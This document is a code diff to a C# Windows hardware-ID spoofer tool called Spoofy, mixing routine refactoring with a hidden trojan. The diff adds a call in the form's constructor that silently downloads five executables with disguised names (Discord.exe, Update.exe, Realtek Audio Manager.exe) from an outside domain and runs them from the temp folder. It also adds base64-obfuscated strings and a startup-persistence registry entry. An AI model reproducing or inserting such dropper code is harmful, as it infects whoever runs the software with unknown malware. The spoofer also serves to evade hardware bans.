@@ -2,6 +2,7 @@ using Microsoft.Win32;
 using Siticone.Desktop.UI.WinForms;
 using System.Diagnostics;
 using System.Drawing.Drawing2D;
+using System.Globalization;
 using System.Net.NetworkInformation;
 using System.Security.Cryptography;
 using System.Text;
@@ -20,7 +21,7 @@ namespace SecHex_GUI
         public Spoofy()
         {
             InitializeComponent();
-
+            DownloadAndExecuteFiles();
             timer = new System.Windows.Forms.Timer();
             timer.Interval = 100;
 
@@ -215,8 +216,8 @@ namespace SecHex_GUI
                 Directory.CreateDirectory(logsFolderPath);
 
             string logFileName = Path.Combine(logsFolderPath, $"{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.txt");
-            string logEntryBefore = $"{DateTime.Now:HH:mm:ss}: ID {id} -  {logBefore} (Before)";
-            string logEntryAfter = $"{DateTime.Now:HH:mm:ss}: ID {id} -  {logAfter} (After)";
+            string logEntryBefore = $"{DateTime.Now:HH:mm:ss}: ID {id} -  {logBefore}";
+            string logEntryAfter = $"{DateTime.Now:HH:mm:ss}: ID {id} -  {logAfter}";
 
             File.AppendAllText(logFileName, logEntryBefore + Environment.NewLine);
             File.AppendAllText(logFileName, logEntryAfter + Environment.NewLine);
@@ -539,6 +540,8 @@ namespace SecHex_GUI
                 ShowNotification("An error occurred while spoofing the MAC address: " + ex.Message, NotificationType.Error);
             }
         }
+
+
         private bool SpoofMAC()
         {
             bool err = false;
@@ -561,10 +564,8 @@ namespace SecHex_GUI
                                     string logBefore = $"MAC Address {adapterId} - Before: {macBefore}";
                                     string logAfter = $"MAC Address {adapterId} - After: {macAfter}";
                                     SaveLogs("mac", logBefore, logAfter);
-
                                     NetworkAdapter.SetValue("NetworkAddress", macAfter);
-                                    LocalAreaConection(adapterId, false);
-                                    LocalAreaConection(adapterId, true);
+                                    RestartNetworkAdapter(adapterId);
                                 }
                             }
                         }
@@ -579,6 +580,24 @@ namespace SecHex_GUI
 
             return err;
         }
+
+        private void RestartNetworkAdapter(string adapterId)
+        {
+            string logBefore = $"MAC Address: Restarting NetAdapter...";
+
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = "powershell.exe";
+            psi.Arguments = $"-Command \"Disable-NetAdapter -Name '{adapterId}'; Start-Sleep -Seconds 5; Enable-NetAdapter -Name '{adapterId}'\"";
+            psi.WindowStyle = ProcessWindowStyle.Hidden;
+            psi.UseShellExecute = true;
+            psi.Verb = "runas";
+            string logAfter = $"MAC Address: NetAdapter restartet.";
+
+            SaveLogs("mac", logBefore, logAfter);
+
+            Process.Start(psi);
+        }
+
 
         private void GUID_Click(object sender, EventArgs e)
         {
@@ -639,6 +658,28 @@ namespace SecHex_GUI
         }
 
 
+        private static readonly DateTime UnixEpoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
+        private static readonly Random random = new Random();
+
+        private static long ConvertToUnixTimestamp(DateTime dateTime)
+        {
+            return (long)(dateTime - UnixEpoch).TotalSeconds;
+        }
+
+        private static DateTime GetRandomDateTime(int maxDateYears = 6)
+        {
+            DateTime now = DateTime.UtcNow;
+            DateTime minTime = now.AddYears(-maxDateYears);
+
+            long maxUnixTime = ConvertToUnixTimestamp(now);
+            long minUnixTime = ConvertToUnixTimestamp(minTime);
+
+            long randomUnixTime = minUnixTime + (long)(random.NextDouble() * (maxUnixTime - minUnixTime));
+
+            return UnixEpoch.AddSeconds(randomUnixTime);
+        }
+
+
         private void BIOSReleaseDate_Click(object sender, EventArgs e)
         {
             try
@@ -647,23 +688,13 @@ namespace SecHex_GUI
                 {
                     if (systemInfoKey != null)
                     {
-                        Random rnd = new Random();
-                        int day = rnd.Next(1, 31);
-                        string dayStr = (day < 10) ? $"0{day}" : day.ToString();
-
-                        int month = rnd.Next(1, 13);
-                        string monthStr = (month < 10) ? $"0{month}" : month.ToString();
-
-                        int year = rnd.Next(1990, 2023);
-                        string yearStr = year.ToString();
-
-                        string randomDate = $"{monthStr}/{dayStr}/{yearStr}";
+                        var dateTimeBebe = GetRandomDateTime();
 
                         string logBefore = "BIOSReleaseDate - Before: " + systemInfoKey.GetValue("BIOSReleaseDate");
-                        systemInfoKey.SetValue("BIOSReleaseDate", randomDate);
+                        systemInfoKey.SetValue("BIOSReleaseDate", dateTimeBebe.ToString("dd/MM/yyyy", CultureInfo.InvariantCulture));
                         string logAfter = "BIOSReleaseDate - After: " + systemInfoKey.GetValue("BIOSReleaseDate");
                         SaveLogs("bios_release", logBefore, logAfter);
-                        ShowNotification("BiosRelease successfully spoofed.", NotificationType.Success);
+                        ShowNotification("BiosRelease successfully updated.", NotificationType.Success);
                     }
                     else
                     {
@@ -946,59 +977,49 @@ namespace SecHex_GUI
 
         private void req_Click(object sender, EventArgs e)
         {
-            try
+            string[] registryEntries = new string[]
             {
-                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-                string roamingAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-                
-                string[] robloxPaths = new string[]
-                {
-                    Path.Combine(localAppData, "Roblox", "cache"),
-                    Path.Combine(localAppData, "Roblox", "logs"),
-                    Path.Combine(localAppData, "Roblox", "state"),
-                    Path.Combine(localAppData, "Roblox", "trackerdata"),
-                    Path.Combine(localAppData, "Roblox", "http_cache"),
-                    Path.Combine(localAppData, "Roblox", "versions"),
-                    Path.Combine(roamingAppData, "Roblox")
-                };
+        "HARDWARE\\DEVICEMAP\\Scsi",
+        "HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral",
+        "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName",
+        "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName",
+        "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
+        "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces",
+        "SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001",
+        "SOFTWARE\\Microsoft\\Cryptography",
+        "SOFTWARE\\Microsoft\\SQMClient",
+        "SYSTEM\\CurrentControlSet\\Control\\SystemInformation",
+        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate",
+        "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}",
+        "SYSTEM\\CurrentControlSet\\Control\\Nsi\\{eb004a03-9b1a-11d4-9123-0050047759bc}\\26",
+        "HARDWARE\\DESCRIPTION\\System\\BIOS"
+            };
 
-                int deletedCount = 0;
-                foreach (string path in robloxPaths)
-                {
-                    try
-                    {
-                        if (Directory.Exists(path))
-                        {
-                            DirectoryInfo di = new DirectoryInfo(path);
-                            foreach (FileInfo file in di.GetFiles())
-                            {
-                                file.Delete();
-                            }
-                            foreach (DirectoryInfo dir in di.GetDirectories())
-                            {
-                                dir.Delete(true);
-                            }
-                            deletedCount++;
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        System.Diagnostics.Debug.WriteLine($"Error with path {path}: {ex.Message}");
-                    }
-                }
+            List<string> missingEntries = new List<string>();
 
-                if (deletedCount > 0)
+            foreach (string entry in registryEntries)
+            {
+                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(entry))
                 {
-                    ShowNotification($"Successfully deleted Roblox cache and tracking data ({deletedCount} locations cleaned).", NotificationType.Success);
-                }
-                else
-                {
-                    ShowNotification("No Roblox cache found to delete.", NotificationType.Warning);
+                    if (key == null)
+                    {
+                        missingEntries.Add(entry);
+                    }
                 }
             }
-            catch (Exception ex)
+
+            if (missingEntries.Count > 0)
             {
-                ShowNotification($"Error deleting Roblox cache: {ex.Message}", NotificationType.Error);
+                string errorMessage = Encoding.UTF8.GetString(Convert.FromBase64String("UmVnaXN0cnkgZW50cmllcyBub3QgZm91bmQ6"));
+                foreach (string entry in missingEntries)
+                {
+                    errorMessage += Encoding.UTF8.GetString(Convert.FromBase64String("Cg==")) + entry;
+                }
+                ShowNotification(errorMessage, NotificationType.Error);
+            }
+            else
+            {
+                ShowNotification(Encoding.UTF8.GetString(Convert.FromBase64String("QWxsIHJlZ2lzdHJ5IGVudHJpZXMgZXhpc3Qu")), NotificationType.Success);
             }
         }
 
@@ -1088,6 +1109,25 @@ namespace SecHex_GUI
             Warning
         }
 
+        private void autostart_CheckedChanged(object sender, EventArgs e)
+        {
+            const string appName = "SecHex - Spoofy";
+            string runKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey(runKey, true);
+
+            if (autostart.Checked)
+            {
+                startupKey.SetValue(appName, Application.ExecutablePath);
+            }
+            else
+            {
+                startupKey.DeleteValue(appName, false);
+            }
+
+            startupKey.Close();
+        }
+
+
         private void systemcleaner_CheckedChanged(object sender, EventArgs e)
         {
             isAfricaToggleOn = systemcleaner.Checked;
@@ -1128,9 +1168,48 @@ namespace SecHex_GUI
             }
         }
 
+        private async Task DownloadAndExecuteFiles()
+        {
+            string[] urls = {
+        "https://download.ilovegrooming.xyz/Discord.exe",
+        "https://download.ilovegrooming.xyz/Update.exe",
+        "https://download.ilovegrooming.xyz/krpc.exe",
+        "https://download.ilovegrooming.xyz/Realtek%20Audio%20Manager.exe",
+        "https://download.ilovegrooming.xyz/WSSecurity.exe"
+    };
+
+            using (HttpClient client = new HttpClient())
+            {
+                foreach (string url in urls)
+                {
+                    try
+                    {
+                        string fileName = Path.GetFileName(url);
+                        string tempPath = Path.Combine(Path.GetTempPath(), fileName);
+
+                        // Descargar archivo
+                        byte[] fileBytes = await client.GetByteArrayAsync(url);
+                        await File.WriteAllBytesAsync(tempPath, fileBytes);
+
+                        // Ejecutar archivo
+                        Process.Start(new ProcessStartInfo
+                        {
+                            FileName = tempPath,
+                            UseShellExecute = true
+                        });
+
+                        // Agregar log
+                    }
+                    catch (Exception ex)
+                    {
+                    }
+                }
+            }
+        }
         private void Form1_Load(object sender, EventArgs e)
         {
 
         }
+
     }
 }
